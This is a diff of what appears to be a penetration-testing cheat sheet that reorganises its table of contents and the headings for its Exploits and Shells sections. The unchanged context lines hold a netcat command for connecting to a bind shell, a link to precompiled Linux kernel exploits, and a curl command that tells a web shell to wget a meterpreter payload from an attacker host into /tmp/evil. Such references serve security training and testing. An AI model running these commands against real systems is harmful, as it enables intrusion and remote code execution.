@@ -19,9 +19,8 @@ export ip=192.168.1.100`**_
   * [Port Scanning](#port-scanning)
   * [Enumeration](#enumeration)
   * [HTTP Enumeration](#http-enumeration)
-- [Buffer Overflows, Exploits and Shells](#buffer-overflows-exploits-and-shells)
-  * [Exploits](#exploits)
-  * [Shells](#shells)
+- [Buffer Overflows and Exploits](#buffer-overflows-exploits-and-shells)
+- [Shells](#shells)
 - [File Transfers](#file-transfers)
 - [Privilege Escalation](#privilege-escalation)
   * [Linux Privilege Escalation](#linux-privilege-escalation)
@@ -753,7 +752,7 @@ export ip=192.168.1.100`**_
     -   Connect to the shell with netcat:  
         nc -v $ip 4444
 
--   <span id="_6isnoas6fx9r" class="anchor"><span id="_Toc480741809" class="anchor"></span></span>Exploits
+   Exploits
     ------------------------------------------------------------------------------------------------------
 
 -   Searching for Exploits
@@ -771,8 +770,8 @@ export ip=192.168.1.100`**_
 -   Precompiled Linux Kernel Exploits  
     [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)
 
--   <span id="_a0s3gfvq9awf" class="anchor"><span id="_Toc480741810" class="anchor"></span></span>Shells
-    ----------------------------------------------------------------------------------------------------
+Shells
+===================================================================================================================================
 
 -   Upload and execute a meterpreter shell using a web shell  
     curl -s --data "cmd=wget http://10.9.0.2:8000/dhn -O /tmp/evil"
